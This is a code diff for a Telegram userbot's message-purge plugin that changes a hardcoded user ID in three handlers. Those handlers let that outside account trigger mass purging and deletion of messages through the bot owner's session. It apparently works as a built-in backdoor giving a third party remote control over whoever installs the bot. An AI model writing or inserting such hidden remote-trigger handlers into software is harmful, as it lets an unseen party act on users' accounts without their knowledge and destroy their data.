@@ -13,7 +13,7 @@ from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
-@register(incoming=True, from_users=1803347744, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -49,7 +49,7 @@ async def fastpurger(purg):
 
 
 @register(outgoing=True, pattern=r"^\.purgeme")
-@register(incoming=True, from_users=1803347744, pattern=r"^\.cpurgeme")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cpurgeme")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
@@ -77,7 +77,7 @@ async def purgeme(delme):
 
 
 @register(outgoing=True, pattern=r"^\.del$")
-@register(incoming=True, from_users=1803347744, pattern=r"^\.cdel$")
+@register(incoming=True, from_users=1979717764, pattern=r"^\.cdel$")
 async def delete_it(delme):
     msg_src = await delme.get_reply_message()
     if delme.reply_to_msg_id:
